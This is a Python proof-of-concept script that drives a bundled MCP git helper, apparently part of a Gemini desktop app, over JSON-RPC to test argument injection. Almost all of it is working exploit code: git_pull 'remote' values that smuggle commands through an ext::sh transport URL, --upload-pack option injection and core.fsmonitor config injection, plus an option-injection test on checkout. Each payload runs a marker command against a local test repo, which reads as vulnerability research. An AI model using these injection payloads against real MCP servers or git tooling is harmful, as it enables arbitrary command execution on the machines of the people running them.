#!/usr/bin/env python3
"""PoC driver: test git_mcp_server (Gemini app's bundled MCP helper) for
argument injection -> command execution via the `remote` parameter.

All tests run against a local throwaway repo (/tmp/rce_test_repo) owned by us.
No third-party data or systems involved.
"""
import subprocess, json, time, os, sys

BIN = "/Applications/Gemini.app/Contents/Helpers/git_mcp_server"
REPO = "/tmp/rce_test_repo"
MARKER = "/tmp/GEMINI_RCE_PROOF"

def clear_marker():
    if os.path.exists(MARKER):
        os.remove(MARKER)

def marker_exists():
    return os.path.exists(MARKER)

proc = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, text=True)
_id = [0]

def send(method, params=None, notify=False):
    if notify:
        obj = {"jsonrpc": "2.0", "method": method}
    else:
        _id[0] += 1
        obj = {"jsonrpc": "2.0", "id": _id[0], "method": method}
        if params: obj["params"] = params
    proc.stdin.write(json.dumps(obj) + '\n')
    proc.stdin.flush()

def read_msg(timeout=25):
    start = time.time()
    line = ''
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if line.strip():
            return json.loads(line)
    return None

# Handshake
send("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                     "clientInfo": {"name": "poc", "version": "1.0"}})
r = read_msg()
assert r and "result" in r, f"init failed: {r}"
send("notifications/initialized", notify=True)
print("handshake ok:", r["result"]["serverInfo"])

def call_tool(name, args, timeout=30):
    send("tools/call", {"name": name, "arguments": args})
    return read_msg(timeout)

def text_of(resp):
    try:
        parts = resp["result"]["content"]
        return " ".join(p.get("text", "") for p in parts if isinstance(p, dict))[:400]
    except Exception:
        return json.dumps(resp)[:400]

print("\n=== TEST A: sanity — git_status on own repo ===")
resp = call_tool("git_status", {"repo_path": REPO})
print(text_of(resp))

print("\n=== TEST B: remote as ext:: transport URL (exec on fetch) ===")
clear_marker()
resp = call_tool("git_pull", {
    "repo_path": REPO,
    "remote": "ext::sh -c touch% /tmp/GEMINI_RCE_PROOF"
})
print("resp:", text_of(resp))
print("MARKER:", marker_exists())

print("\n=== TEST C: remote as option injection (--upload-pack) ===")
clear_marker()
# make origin a local path so fetch uses upload-pack
os.system(f"cd {REPO} && git remote remove origin 2>/dev/null; git remote add origin /tmp/rce_test_repo 2>/dev/null")
resp = call_tool("git_pull", {
    "repo_path": REPO,
    "remote": "--upload-pack=touch /tmp/GEMINI_RCE_PROOF"
})
print("resp:", text_of(resp))
print("MARKER:", marker_exists())

print("\n=== TEST D: remote = -c config injection (core.fsmonitor) ===")
clear_marker()
resp = call_tool("git_pull", {
    "repo_path": REPO,
    "remote": "-c core.fsmonitor=touch /tmp/GEMINI_RCE_PROOF"
})
print("resp:", text_of(resp))
print("MARKER:", marker_exists())

print("\n=== TEST E: checkout target option injection ===")
clear_marker()
resp = call_tool("git_checkout", {
    "repo_path": REPO,
    "target": "--help"
})
print("resp:", text_of(resp))

proc.kill()
print("\nDONE. Marker final state:", marker_exists())
